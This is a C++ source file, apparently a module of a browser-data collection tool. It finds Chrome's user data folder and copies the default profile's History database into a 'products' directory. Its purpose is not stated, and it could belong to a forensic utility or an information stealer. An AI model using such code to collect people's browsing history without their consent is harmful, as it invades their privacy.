#include "Chrome.h"


Tool::Browsers::Chrome::Chrome(Tool::Configuration::config_t MainContext_t):Chromium(MainContext_t){
	this->sBrowserIdentifier = STR("Chrome");
	std::string sAppDataPath;
	Tool::Utils::GetLocalAppDataPath(sAppDataPath);
	this->sBrowserRootPath = std::format(STR("{}\\Google\\Chrome\\User Data"), sAppDataPath);
	this->bIsBrowserInstalled = Tool::Utils::IsApplicationInstalled(this->sBrowserRootPath);
	if (!this->bIsBrowserInstalled) {
		Tool::Utils::print(STR("Chrome not installed"));
		return;
	}
	Tool::Utils::print(STR("Chrome installed"));
	this->CreateBrowserProductDir();
}

bool Tool::Browsers::Chrome::CopyHistoryDB()
{
	std::string sBuffer;
	std::string sDbFilePath = std::format(STR("{}\\Default\\History"), this->sBrowserRootPath);
	this->CopyBrowserFileToProducts(sDbFilePath, sBuffer);
	return !sBuffer.empty();
}